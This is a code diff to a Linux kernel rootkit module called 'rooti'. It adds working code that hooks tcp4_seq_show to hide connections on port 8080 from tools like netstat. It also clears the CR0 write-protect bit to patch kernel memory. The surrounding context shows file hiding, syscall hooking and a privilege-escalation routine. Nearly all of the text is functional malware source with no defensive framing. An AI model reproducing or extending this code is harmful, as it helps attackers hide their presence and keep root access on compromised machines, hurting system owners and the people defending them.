@@ -6,6 +6,9 @@
 #include <linux/cred.h>
 #include <linux/uaccess.h>
 #include <linux/dirent.h>
+#include <linux/seq_file.h>
+#include <net/sock.h>
+#include <net/tcp.h>
 #include "hooking.c"
 
 MODULE_LICENSE("GPL");
@@ -15,6 +18,9 @@ MODULE_VERSION("1.0.0");
 
 // Prefix of files that we wish to hide
 #define ROOTI_HIDE_PREFIX "secret"
+
+// Port number to hide from tools like netstat
+#define ROOTI_HIDE_PORT 8080
 
 // Unused signal numbers can, be used by the rootkit for its own purposes
 enum rooti_signals {
@@ -65,6 +71,8 @@ static asmlinkage long (*rooti_orig_close)(const struct pt_regs *regs);
 static asmlinkage long (*rooti_orig_dup2)(const struct pt_regs *regs);
 static asmlinkage long (*rooti_orig_read)(const struct pt_regs *regs);
 static asmlinkage long (*rooti_orig_getdents64)(const struct pt_regs *regs);
+
+static int (*rooti_orig_tcp4_seq_show)(struct seq_file *seq, void *v);
 
 /*
     Escalates the privilege of the current process in execution to root user & group.
@@ -378,6 +386,18 @@ static asmlinkage long rooti_hook_getdents64(const struct pt_regs *regs)
     return nread;
 }
 
+static int rooti_hook_tcp4_seq_show(struct seq_file *seq, void *v)
+{
+    struct sock *socket = v;
+
+    // Check that this is not the header line and that the record is the one we want to hide
+    if (socket != SEQ_START_TOKEN && socket->sk_num == ROOTI_HIDE_PORT) {
+        return 0;
+    }
+    // Not the port to hide - calL the original handler
+    return rooti_orig_tcp4_seq_show(seq, v);
+}
+
 
 // List of system calls to hook :D
 struct rooti_syscall_hook hooks[] = {
@@ -388,6 +408,24 @@ struct rooti_syscall_hook hooks[] = {
     ROOTI_HOOK("sys_read", rooti_hook_read, &rooti_orig_read),
     ROOTI_HOOK("sys_getdents64", rooti_hook_getdents64, &rooti_orig_getdents64)
 };
+
+static inline void rooti_force_write_cr0(unsigned long val)
+{
+    unsigned long __force_order;
+    asm volatile("mov %0, %%cr0" : "+r"(val), "+m"(__force_order));
+}
+
+/* Disable the write protcetion by clearing the 16th bit of the CR0 register */
+static inline void rooti_unprotect_memory(void)
+{
+    rooti_force_write_cr0(read_cr0() & (~0x10000));
+}
+
+/* Enable the write protection by setting the 16th bit of the CR0 register */
+static inline void rooti_protect_memory(void)
+{
+    rooti_force_write_cr0(read_cr0() | (0x10000));
+}
 
 
 /* LKM initialization */
@@ -407,6 +445,14 @@ static int __init rooti_init(void)
         printk(KERN_DEBUG "rooti: rooti_install_hooks() failed: %d\n", ret);
         return ret;
     }
+
+    rooti_unprotect_memory();
+
+    struct seq_operations *__tcp4_seq_ops = (struct seq_operations *)__kallsyms_lookup_name("tcp4_seq_ops");
+    rooti_orig_tcp4_seq_show = __tcp4_seq_ops->show;
+    __tcp4_seq_ops->show = rooti_hook_tcp4_seq_show;
+
+    rooti_protect_memory();
 
     // TODO: at some point rooti_hideme() should be called on init
 
@@ -428,6 +474,13 @@ static void __exit rooti_exit(void)
         list_del(&record->head);
         kfree(record);
     }
+
+    rooti_unprotect_memory();
+
+    struct seq_operations *__tcp4_seq_ops = (struct seq_operations *)__kallsyms_lookup_name("tcp4_seq_ops");
+    __tcp4_seq_ops->show = rooti_orig_tcp4_seq_show;
+
+    rooti_protect_memory();
 }
 
 module_init(rooti_init);
